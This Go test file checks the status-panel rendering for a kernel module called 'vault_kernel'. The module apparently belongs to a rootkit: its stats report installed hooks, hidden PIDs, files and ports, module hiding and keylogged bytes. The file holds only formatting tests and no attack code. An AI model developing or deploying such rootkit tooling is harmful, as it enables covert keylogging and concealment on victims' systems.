package ioctl

import (
	"strings"
	"testing"
)

// The watch panel layout is a user-facing contract: keys sorted,
// column-aligned values, "(none)" for empty hidden sections and a
// "(no stats)" placeholder when the module returned nothing.
func TestRenderWatchPanelFull(t *testing.T) {
	stats := map[string]string{
		"module":          "vault_kernel",
		"version":         "3.11",
		"hooks_installed": "7",
		"hooks_planned":   "7",
		"module_hidden":   "0",
		"hidden_files":    "1",
		"hidden_pids":     "1",
		"hidden_ports":    "1",
		"keylog_bytes":    "0",
		"uptime_s":        "42",
	}
	hl := HiddenList{
		PIDs:  []int{1234, 567},
		Files: []string{"secret.txt", "my dir/with space.txt"},
		Ports: []int{8080},
	}
	got := RenderWatchPanel(stats, hl, 1000, "01:42:10")

	if !strings.Contains(got, "vault_kernel watch — refresh 1000 ms — updated 01:42:10 — Ctrl-C to stop") {
		t.Errorf("header missing/incorrect:\n%s", got)
	}
	if !strings.Contains(got, "== stats ==") || !strings.Contains(got, "== hidden ==") {
		t.Errorf("section titles missing:\n%s", got)
	}
	// Keys sorted alphabetically: hooks_installed before hooks_planned,
	// module_hidden before module... check a couple of relative orders.
	if i1, i2 := strings.Index(got, "hooks_installed"), strings.Index(got, "hooks_planned"); i1 > i2 {
		t.Errorf("stats keys not sorted (hooks_installed after hooks_planned):\n%s", got)
	}
	// Column alignment: the widest key ("hooks_installed", 15) defines
	// the pad width, then the format adds " : " — so "version" is
	// followed by 9 spaces before the colon.
	if !strings.Contains(got, "version         : 3.11") {
		t.Errorf("version row missing/misaligned:\n%s", got)
	}
	if !strings.Contains(got, "pids : 1234, 567") {
		t.Errorf("pids row missing:\n%s", got)
	}
	if !strings.Contains(got, "files: secret.txt, my dir/with space.txt") {
		t.Errorf("files row missing (must keep verbatim names):\n%s", got)
	}
	if !strings.Contains(got, "ports: 8080") {
		t.Errorf("ports row missing:\n%s", got)
	}
}

func TestRenderWatchPanelEmptySections(t *testing.T) {
	hl := HiddenList{PIDs: []int{}, Files: []string{}, Ports: []int{}}
	got := RenderWatchPanel(map[string]string{}, hl, 500, "00:00:00")
	if !strings.Contains(got, "stats: (no stats)") {
		t.Errorf("empty stats placeholder missing:\n%s", got)
	}
	for _, want := range []string{"pids : (none)", "files: (none)", "ports: (none)"} {
		if !strings.Contains(got, want) {
			t.Errorf("empty section row %q missing:\n%s", want, got)
		}
	}
}

// RenderWatchPanelDiff (v3.10): with a prev report, changed stats get
// " (was X)", unseen keys get " (new)"; unchanged rows stay clean and
// prev == nil reproduces the classic panel byte-for-byte.
func TestRenderWatchPanelDiff(t *testing.T) {
	prev := map[string]string{
		"module":          "vault_kernel",
		"version":         "3.11",
		"hooks_installed": "7",
		"hooks_planned":   "7",
		"module_hidden":   "0",
		"hidden_files":    "1",
		"hidden_pids":     "1",
		"hidden_ports":    "1",
		"keylog_bytes":    "0",
		"uptime_s":        "42",
	}
	cur := map[string]string{
		"module":          "vault_kernel",
		"version":         "3.11",
		"hooks_installed": "7",
		"hooks_planned":   "7",
		"module_hidden":   "0",
		"hidden_files":    "2", // changed
		"hidden_pids":     "1",
		"hidden_ports":    "1",
		"keylog_bytes":    "11", // changed
		"uptime_s":        "43", // changed
	}
	hl := HiddenList{PIDs: []int{}, Files: []string{"x"}, Ports: []int{}}
	got := RenderWatchPanelDiff(cur, prev, hl, 1000, "01:42:10")

	if !strings.Contains(got, "uptime_s        : 43 (was 42)") {
		t.Errorf("changed stat not annotated:\n%s", got)
	}
	if !strings.Contains(got, "keylog_bytes    : 11 (was 0)") {
		t.Errorf("changed stat not annotated:\n%s", got)
	}
	if !strings.Contains(got, "hidden_files    : 2 (was 1)") {
		t.Errorf("changed stat not annotated:\n%s", got)
	}
	if strings.Contains(got, "hooks_installed : 7 (was 7)") {
		t.Errorf("unchanged stat must not be annotated:\n%s", got)
	}

	// A key absent from prev is "(new)".
	cur["fresh_key"] = "1"
	got = RenderWatchPanelDiff(cur, prev, hl, 1000, "01:42:10")
	if !strings.Contains(got, "fresh_key       : 1 (new)") {
		t.Errorf("new key not annotated:\n%s", got)
	}

	// prev == nil: identical to the legacy panel (no annotations).
	delete(cur, "fresh_key")
	diff := RenderWatchPanelDiff(cur, nil, hl, 1000, "01:42:10")
	plain := RenderWatchPanel(cur, hl, 1000, "01:42:10")
	if diff != plain {
		t.Errorf("prev=nil must equal RenderWatchPanel:\n--- diff ---\n%s\n--- plain ---\n%s", diff, plain)
	}
	if strings.Contains(diff, "(was ") {
		t.Errorf("no annotation expected without prev:\n%s", diff)
	}
}
